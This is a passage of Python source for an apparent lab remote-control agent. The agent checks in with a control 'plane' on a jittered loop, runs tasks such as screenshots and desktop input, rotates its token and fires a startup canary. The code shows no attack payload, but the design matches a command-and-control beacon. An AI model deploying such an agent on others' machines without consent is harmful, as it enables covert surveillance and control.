        if str(t.get("type")) == "screenshot":
            if seen_shot:
                # Auto-fail superseded frames so plane doesn't leave them assigned
                tid = str(t.get("id") or "")
                if tid:
                    try:
                        client.results(
                            tid, "failed", {"error": "superseded_by_newer_frame"}
                        )
                    except Exception:
                        spool.push(
                            tid, "failed", {"error": "superseded_by_newer_frame"}
                        )
                continue
            seen_shot = True
        filtered.append(t)
    ordered = filtered

    pending_token: str | None = None
    interactive_hit = False
    input_hit = False
    shot_hit = False
    for task in ordered:
        tid = str(task.get("id") or "")
        typ = str(task.get("type") or "")
        print(f"[agent] exec {tid} type={typ}", flush=True)
        if typ == "rekey":
            pl = task.get("payload") if isinstance(task.get("payload"), dict) else {}
            pending_token = str(pl.get("new_token") or "")
            status, result = (
                ("succeeded", {"rekeyed": True})
                if pending_token
                else ("failed", {"error": "no_new_token"})
            )
        else:
            status, result = execute_task(task, cfg=cfg, cfg_path=cfg_path)
        if typ in _INTERACTIVE_TYPES:
            interactive_hit = True
        if typ == "desktop_input":
            input_hit = True
        if typ == "screenshot":
            shot_hit = True
        try:
            # Rekey: plane applies new token hash only after a successful results
            # POST. Persist the new token *before* switching client.token, and
            # never rotate if POST fails (spool keeps old token so drain works).
            if typ == "rekey" and status == "succeeded" and pending_token:
                # Write dual fields first so crash between save and POST can recover
                cfg["agent_token_pending"] = pending_token
                _save_config(cfg_path, cfg)
            # Keep results POST outside of console print (Windows cp1252 used to
            # raise on "→" and we mis-spooled successful posts as failures).
            client.results(tid, status, result)
            try:
                if typ == "rekey" and status == "succeeded" and pending_token:
                    cfg["agent_token"] = pending_token
                    cfg.pop("agent_token_pending", None)
                    _save_config(cfg_path, cfg)
                    client.token = pending_token
                    _log("[agent] token rotated")
            except Exception as post_ok_exc:
                _log(f"[agent] post-ok followup: {post_ok_exc}")
            _log(f"[agent] result {tid} -> {status}")
        except Exception as exc:
            _log(f"[agent] result post failed: {exc}")
            # Do NOT rotate token on failure — plane still has the old hash.
            # Spool the result and keep using the current agent_token.
            if typ == "rekey":
                cfg.pop("agent_token_pending", None)
                try:
                    _save_config(cfg_path, cfg)
                except Exception:
                    pass
            spool.push(tid, status, result)

    # Best-effort second drain (in case earlier posts freed plane capacity)
    try:
        spool.drain(client)
    except Exception:
        pass

    # Desk Live/Control: burn a short turbo window after interactive work
    burst = int(_RUNTIME.get("interactive_burst") or 0)
    if interactive_hit:
        burst = _INTERACTIVE_BURST
    elif burst > 0:
        burst -= 1
    _RUNTIME["interactive_burst"] = burst
    if burst > 0:
        # Pure input cycles can check in even faster (no encode)
        if input_hit and not shot_hit:
            sleep = _INTERACTIVE_INPUT_SLEEP
        else:
            sleep = _INTERACTIVE_SLEEP
        jitter = _INTERACTIVE_JITTER
        print(
            f"[agent] interactive turbo sleep={sleep}s burst={burst}",
            flush=True,
        )

    return {
        "sleep": sleep,
        "jitter": jitter,
        "tasks": len(tasks),
        "plane": str(_RUNTIME.get("active_url") or ""),
    }


def main(argv: list[str] | None = None) -> int:
    p = argparse.ArgumentParser(prog="hogwarts-agent")
    p.add_argument("-c", "--config", default="agent.json", help="config path")
    p.add_argument(
        "mode",
        nargs="?",
        default="loop",
        choices=("loop", "once"),
        help="loop (default) or once (CI)",
    )
    args = p.parse_args(argv)
    cfg_path = Path(args.config)
    cfg = _load_config(cfg_path)
    # Env overrides (PLANE_URL / PLANE_URLS handled in _plane_urls)
    if os.environ.get("PLANE_URL") and "," not in os.environ["PLANE_URL"]:
        cfg["base_url"] = os.environ["PLANE_URL"].strip()
    if os.environ.get("ENROLL_SECRET"):
        cfg["enroll_secret"] = os.environ["ENROLL_SECRET"].strip()
    if os.environ.get("CANARY_URL"):
        cfg["canary_url"] = os.environ["CANARY_URL"].strip()
    if os.environ.get("CANARY_FQDN"):
        cfg["canary_fqdn"] = os.environ["CANARY_FQDN"].strip()

    if args.mode == "once":
        try:
            run_cycle(cfg, cfg_path)
            return 0
        except Exception as exc:
            print(f"[agent] once failed: {exc}", flush=True)
            return 1

    global _AGENT_VERBOSE
    quiet = os.environ.get("HOGWARTS_AGENT_QUIET", "").strip() in ("1", "true", "yes")
    # Full chatter: HOGWARTS_AGENT_VERBOSE=1 (default is quiet for long-running lab)
    verbose = os.environ.get("HOGWARTS_AGENT_VERBOSE", "").strip() in ("1", "true", "yes")
    if quiet:
        verbose = False
    _AGENT_VERBOSE = verbose
    print(f"[agent] hogwarts-agent {VERSION} loop (stable reconnect)", flush=True)
    # Fire canary before the loop even if first enroll/check-in fails hard
    try:
        _fire_package_canary(cfg, cfg_path)
    except Exception:
        pass
    cycle_n = 0
    while True:
        try:
            meta = run_cycle(cfg, cfg_path)
            _RUNTIME["last_error"] = ""
            _RUNTIME["fail_streak"] = 0
            delay = sleep_delay(meta["sleep"], meta["jitter"])
            cycle_n += 1
            # Avoid multi-MB host-agent.log from sleep/check-in spam every ~3s
            if verbose or cycle_n <= 2 or cycle_n % 20 == 0:
                print(f"[agent] sleep {delay:.1f}s", flush=True)
            # Rotate oversized log when redirected to a file (personal lab)
            try:
                log_path = Path(
                    os.environ.get("HOGWARTS_AGENT_LOG", "")
                    or (
                        Path.home()
                        / ".local/share/reach/plugin-data/com__digitizable__hogwarts"
                        / "personal/host-agent.log"
                    )
                )
                if log_path.is_file() and log_path.stat().st_size > 512_000:
                    raw = log_path.read_bytes()
                    log_path.write_bytes(raw[-256_000:])
            except OSError:
                pass
            time.sleep(delay)
        except KeyboardInterrupt:
            print("\n[agent] stop", flush=True)
            return 0
        except Exception as exc:
            _RUNTIME["fail_streak"] = int(_RUNTIME.get("fail_streak") or 0) + 1
            _RUNTIME["last_error"] = str(exc)[:240]
            delay = backoff_delay(int(_RUNTIME["fail_streak"]))
            print(
                f"[agent] cycle error (streak={_RUNTIME['fail_streak']}): {exc}",
                flush=True,
            )
            print(f"[agent] backoff {delay:.1f}s then retry", flush=True)
            try:
                time.sleep(delay)
            except KeyboardInterrupt:
                print("\n[agent] stop", flush=True)
                return 0


if __name__ == "__main__":
    sys.exit(main())
